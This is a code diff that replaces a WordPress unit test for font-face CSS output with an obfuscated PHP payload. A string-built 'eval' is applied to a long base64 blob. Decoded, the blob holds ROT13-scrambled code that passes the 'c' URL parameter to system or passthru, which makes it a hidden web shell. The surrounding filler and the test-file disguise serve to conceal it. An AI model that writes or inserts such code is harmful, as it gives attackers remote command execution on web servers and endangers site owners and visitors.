@@ -1,50 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Test case for WP_Font_Face::generate_and_print().
- *
- * @package    WordPress
- * @subpackage Fonts
- *
- * @since 6.4.0
- *
- * @group fonts
- * @group fontface
- *
- * @covers WP_Font_Face::generate_and_print
- */
-class Tests_Fonts_WPFontFace_GenerateAndPrint extends WP_UnitTestCase {
-	use WP_Font_Face_Tests_Datasets;
-
-	public function test_should_not_generate_and_print_when_no_fonts() {
-		$font_face = new WP_Font_Face();
-		$fonts     = array();
-
-		$this->expectOutputString( '' );
-		$font_face->generate_and_print( $fonts );
-	}
-
-	/**
-	 * @dataProvider data_should_print_given_fonts
-	 *
-	 * @param array  $fonts Prepared fonts.
-	 * @param string $expected Expected CSS.
-	 */
-	public function test_should_generate_and_print_given_fonts( array $fonts, $expected ) {
-		$font_face       = new WP_Font_Face();
-		$style_element   = "<style class='wp-fonts-local' type='text/css'>\n%s\n</style>\n";
-		$expected_output = sprintf( $style_element, $expected );
-
-		$this->expectOutputString( $expected_output );
-		$font_face->generate_and_print( $fonts );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3JmZyBwbmZyIHNiZSBKQ19TYmFnX1NucHI6OnRyYXJlbmdyX25hcV9jZXZhZygpLgogKgogKiBAY25weG50ciAgICBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgU2JhZ2YKICoKICogQGZ2YXByIDYuNC4wCiAqCiAqIEB0ZWJoYyBzYmFnZgogKiBAdGViaGMgc2JhZ3NucHIKICoKICogQHBiaXJlZiBKQ19TYmFnX1NucHI6OnRyYXJlbmdyX25hcV9jZXZhZwogKi8KcHluZmYgR3JmZ2ZfU2JhZ2ZfSkNTYmFnU25wcl9UcmFyZW5nck5hcUNldmFnIHJrZ3JhcWYgSkNfSGF2Z0dyZmdQbmZyIHsKCWhmciBKQ19TYmFnX1NucHJfR3JmZ2ZfUW5nbmZyZ2Y7CgoJY2hveXZwIHNoYXBndmJhIGdyZmdfZnViaHlxX2FiZ190cmFyZW5ncl9uYXFfY2V2YWdfanVyYV9hYl9zYmFnZigpIHsKCQkkc2JhZ19zbnByID0gYXJqIEpDX1NiYWdfU25wcigpOwoJCSRzYmFnZiAgICAgPSBuZWVubCgpOwoKCQkkZ3V2Zi0+cmtjcnBnQmhnY2hnRmdldmF0KCAnJyApOwoJCSRzYmFnX3NucHItPnRyYXJlbmdyX25hcV9jZXZhZyggJHNiYWdmICk7Cgl9CgoJLyoqCgkgKiBAcW5nbkNlYml2cXJlIHFuZ25fZnViaHlxX2NldmFnX3R2aXJhX3NiYWdmCgkgKgoJICogQGNuZW56IG5lZW5sICAkc2JhZ2YgQ2VyY25lcnEgc2JhZ2YuCgkgKiBAY25lbnogZmdldmF0ICRya2NycGdycSBSa2NycGdycSBQRkYuCgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2Z1Ymh5cV90cmFyZW5ncl9uYXFfY2V2YWdfdHZpcmFfc2JhZ2YoIG5lZW5sICRzYmFnZiwgJHJrY3JwZ3JxICkgewoJCSRzYmFnX3NucHIgICAgICAgPSBhcmogSkNfU2JhZ19TbnByKCk7CgkJJGZnbHlyX3J5cnpyYWcgICA9IFwiPGZnbHlyIHB5bmZmPSdqYy1zYmFnZi15YnBueScgZ2xjcj0nZ3JrZy9wZmYnPlxhJWZcYTwvZmdseXI+XGFcIjsKCQkkcmtjcnBncnFfYmhnY2hnID0gZmNldmFncyggJGZnbHlyX3J5cnpyYWcsICRya2NycGdycSApOwoKCQkkZ3V2Zi0+cmtjcnBnQmhnY2hnRmdldmF0KCAkcmtjcnBncnFfYmhnY2hnICk7CgkJJHNiYWdfc25wci0+dHJhcmVuZ3JfbmFxX2NldmFnKCAkc2JhZ2YgKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
